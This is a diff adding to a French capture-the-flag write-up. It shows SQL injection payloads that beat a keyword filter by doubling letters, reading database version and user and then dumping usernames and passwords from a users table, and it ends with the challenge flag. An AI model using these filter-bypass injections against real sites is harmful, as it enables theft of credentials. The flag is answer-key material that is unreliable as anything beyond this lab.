@@ -50,4 +50,21 @@ Reste à déterminer le nombre de colonnes de façon itérative :
 ' and 0 UUNIONNION SSELECTELECT 1,2,3# <-- les numéros de colonnes s'affichent 
 ```
 
-[ Suite à venir ]
+Maintenant qu'on a le nombre de colonne, reste plus qu'à chercher un peu dans la bdd :
+
+```
+' and 0 UUNIONNION SSELECTELECT version(),user(),database()#
+```
+
+on pourrait facilement retrouver le nom des tables mais le plus simple reste d'essayer avec des nom de tables / champs classiques :
+
+
+```
+' and 0 UUNIONNION SSELECTELECT username,password,3 from users#
+```
+
+Et le challenge est validé :)
+
+`INEAT{azerty-is-a-g00d-p4ssw0rd}`
+
+# Gogol 2
